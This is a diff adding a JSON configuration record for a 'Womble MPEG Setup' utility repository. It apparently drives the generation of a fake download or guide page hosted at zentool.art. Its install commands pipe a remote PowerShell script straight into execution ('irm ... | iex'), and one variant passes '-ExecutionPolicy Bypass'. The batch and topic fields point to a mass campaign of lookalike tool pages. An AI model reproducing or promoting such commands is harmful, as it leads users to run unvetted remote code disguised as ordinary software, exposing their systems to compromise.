@@ -1,0 +1,28 @@
+{
+  "repo": "Womble-MPEG-Setup",
+  "product": "Womble MPEG Setup",
+  "product_title": "Womble MPEG",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-zentool-moltora-pending",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "womble-mpeg-windows",
+    "womble-config",
+    "womble-integration",
+    "womble-latest",
+    "system-tools",
+    "windows-utility",
+    "desktop-tools",
+    "maintenance",
+    "configuration",
+    "performance-tuning",
+    "disk-cleanup",
+    "uninstaller"
+  ],
+  "site": "zentool.art"
+}
